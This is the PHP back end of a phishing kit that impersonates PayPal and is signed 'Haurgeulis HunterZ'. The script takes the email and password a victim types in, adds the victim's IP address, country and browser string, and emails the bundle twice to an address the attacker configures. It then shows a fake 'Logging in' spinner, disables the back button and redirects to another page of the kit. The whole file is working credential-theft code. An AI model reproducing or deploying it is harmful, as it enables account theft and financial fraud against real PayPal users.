<?php

include('../../detect.php');

///========================// IEC \\========================\\\
$email    = $_POST['login_email'];
$password = $_POST['login_password'];
///===================// IEC \\===================\\\

$valid  = filter_var($email, FILTER_VALIDATE_EMAIL) && preg_match('/@.+\./', $email);

    if (!$valid || strlen($password) < 8 || strlen($password) > 20) {
        header("LOCATION: websrc?cmd=_login-submit&dispatch=".md5(gmdate('r')).sha1(gmdate('r')));
    } else {

//+++++++++++++++++++++++++++++// ISI PESAN \\+++++++++++++++++++++++++++++\\
$message   = "
++========[ Haurgeulis HunterZ ]========++

      .++====[ PayPal ]====++.
Email     :  ".$email."
Password  :  ".$password."
      .++======[ End ]======++.

      .++====[ PC Info ]====++.
IP Info   :  ".$ip." | ".$nama_negara." On ".date('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."
      .++======[ End ]======++.

++===[ ^_^ Haurgeulis Money HunterZ ^_^ ]===++
";
//+++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++\\\

include '../../____YourMail____.php';
$subject = "PayPal (".$nama_negara.") (".$ip.")";
$headers = "From: PP Spam Result <result@iec.com>";
mail($emailku, $subject, $message, $headers);

include '../../myaccount/form/ip_info.php';
$subject = "PayPal (".$nama_negara.") (".$ip.")";
$headers = "From: PP Spam Result <result@iec.com>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Logging in – PayPaI</title>
<meta http-equiv="X-UA-Compatible" content="IE=9">
<style type="text/css">#page{width:auto;}#rotatingImg{display:none}#rotatingDiv{display:block;margin:32px auto;height:30px;width:30px;-webkit-animation:rotation .7s infinite linear;-moz-animation:rotation .7s infinite linear;-o-animation:rotation .7s infinite linear;animation:rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid rgba(33,128,192,1);border-radius:100%}@keyframes rotation{from{transform:rotate(0deg)}to{transform:rotate(359deg)}}@-webkit-keyframes rotation{from{-webkit-transform:rotate(0deg)}to{-webkit-transform:rotate(359deg)}}@-moz-keyframes rotation{from{-moz-transform:rotate(0deg)}to{-moz-transform:rotate(359deg)}}@-o-keyframes rotation{from{-o-transform:rotate(0deg)}to{-o-transform:rotate(359deg)}}h3{font-size:1.4em;margin:4em 0 0;line-height:normal}p.note{color:#656565;font-size:1.2em}p.note a{color:#656565}p{margin-top:2em;color:#1A3665;font-size:1.25em}img.actionImage{margin:2em auto}</style>

<SCRIPT type="text/javascript">window.history.forward();function noBack() { window.history.forward(); }</SCRIPT>
<link rel="shortcut icon" href="../../icon/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="../../icon/apple-touch-icon.png">
</head>
<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<div id="page" align="center">
    <div id="content">
    <div id="main">
        <div class="layout1 textcenter">
            <h3>One moment...</h3>
<div id="rotatingDiv"></div>
    <img id="rotatingImg" border="0" class="actionImage" alt="Logging you in securely">
        <p class="note">Still loading after a few seconds? <a href="../../myaccount">Try again</a>.</p></div></div></div>
</div>

<script type="text/JavaScript">
<!--
setTimeout("location.href = '../../myaccount';",500);
-->
</script>
    </body>
</html>

<?php
}
?>